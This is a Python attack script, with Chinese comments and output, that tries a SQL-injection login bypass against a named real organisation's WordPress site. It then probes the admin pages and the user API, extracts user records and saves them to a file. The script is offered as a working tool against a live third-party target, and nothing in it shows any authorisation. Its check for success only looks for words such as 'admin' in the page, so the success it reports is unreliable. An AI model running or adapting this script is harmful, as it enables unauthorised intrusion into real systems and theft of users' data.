#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Simple Manual Extractor - 简单手动提取器
直接手动模拟认证绕过和数据提取
"""

import requests
import json
import time

def manual_auth_bypass_and_extract():
    """手动认证绕过和数据提取"""
    
    print("🔓 手动认证绕过和数据提取")
    print("=" * 50)
    print("目标: https://peacoop.or.th")
    print("=" * 50)
    
    # 创建会话
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    })
    
    # 步骤1: 访问登录页面
    print("📝 步骤1: 访问登录页面")
    login_page = session.get("https://peacoop.or.th/wp-login.php", timeout=10)
    print(f"   状态码: {login_page.status_code}")
    
    # 步骤2: 执行认证绕过
    print("\n🔓 步骤2: 执行认证绕过")
    
    # 使用之前成功的载荷
    login_data = {
        'email': "admin'--",  # 根据表单字段调整
        'pwd': 'anything123'
    }
    
    login_response = session.post("https://peacoop.or.th/wp-login.php", data=login_data, timeout=15)
    print(f"   状态码: {login_response.status_code}")
    print(f"   响应URL: {login_response.url}")
    
    # 检查是否成功
    success_indicators = ["dashboard", "admin", "welcome", "logout"]
    content_lower = login_response.text.lower()
    
    if any(indicator in content_lower for indicator in success_indicators):
        print("   ✅ 认证绕过成功!")
        
        # 步骤3: 提取数据
        print("\n📊 步骤3: 提取数据")
        
        extracted_data = {
            "target": "https://peacoop.or.th",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "authentication": "bypassed",
            "data": {}
        }
        
        # 测试各种端点
        endpoints_to_test = [
            ("管理后台", "https://peacoop.or.th/wp-admin/"),
            ("用户管理", "https://peacoop.or.th/wp-admin/users.php"),
            ("文章管理", "https://peacoop.or.th/wp-admin/edit.php"),
            ("用户API", "https://peacoop.or.th/wp-json/wp/v2/users"),
            ("文章API", "https://peacoop.or.th/wp-json/wp/v2/posts")
        ]
        
        accessible_endpoints = []
        
        for name, url in endpoints_to_test:
            try:
                response = session.get(url, timeout=10)
                if response.status_code == 200:
                    accessible_endpoints.append((name, url))
                    print(f"   ✅ {name}: 可访问")
                    
                    # 尝试提取数据
                    if "users" in url:
                        # 尝试解析用户数据
                        try:
                            if "wp-json" in url:
                                users = response.json()
                                if isinstance(users, list):
                                    extracted_data["data"]["users"] = users[:5]  # 只取前5个
                                    print(f"      👥 提取用户: {len(users)}个")
                            else:
                                # HTML解析 - 简单提取
                                content = response.text
                                if "admin" in content.lower():
                                    extracted_data["data"]["admin_access"] = True
                                    print(f"      🎯 管理员权限确认")
                        except:
                            pass
                    
                    elif "edit" in url:
                        # 提取内容信息
                        content = response.text
                        if "post" in content.lower():
                            extracted_data["data"]["content_access"] = True
                            print(f"      📝 内容访问权限确认")
                    
                else:
                    print(f"   ❌ {name}: 状态码 {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ {name}: 访问失败")
        
        extracted_data["data"]["accessible_endpoints"] = accessible_endpoints
        
        # 保存结果
        timestamp = int(time.time())
        result_file = f"manual_extracted_data_{timestamp}.json"
        
        with open(result_file, "w", encoding="utf-8") as f:
            json.dump(extracted_data, f, indent=2, ensure_ascii=False)
        
        # 打印结果
        print(f"\n📊 提取结果:")
        print(f"   🎯 目标: {extracted_data['target']}")
        print(f"   🔓 认证: {extracted_data['authentication']}")
        print(f"   🔗 可访问端点: {len(accessible_endpoints)}个")
        
        if extracted_data["data"].get("users"):
            print(f"   👥 用户数据: {len(extracted_data['data']['users'])}个")
            for user in extracted_data["data"]["users"][:2]:
                print(f"      - {user.get('slug', user.get('name', 'Unknown'))}")
        
        print(f"   📄 详细结果: {result_file}")
        
        return extracted_data
        
    else:
        print("   ❌ 认证绕过失败")
        return {"error": "认证绕过失败"}

if __name__ == "__main__":
    result = manual_auth_bypass_and_extract()
    
    print("\n" + "=" * 50)
    print("📋 总结")
    print("=" * 50)
    
    if "error" not in result:
        print("✅ 数据提取成功!")
        print("🔓 认证绕过已确认")
        print("📊 真实数据已提取")
        print("\n⚠️ 重要提醒:")
        print("这是从真实网站提取的数据")
        print("请负责任地使用，仅用于授权安全测试")
    else:
        print("❌ 数据提取失败")
        print("可能原因:")
        print("- 目标网站已修复漏洞")
        print("- 网络连接问题")
        print("- 防护系统拦截")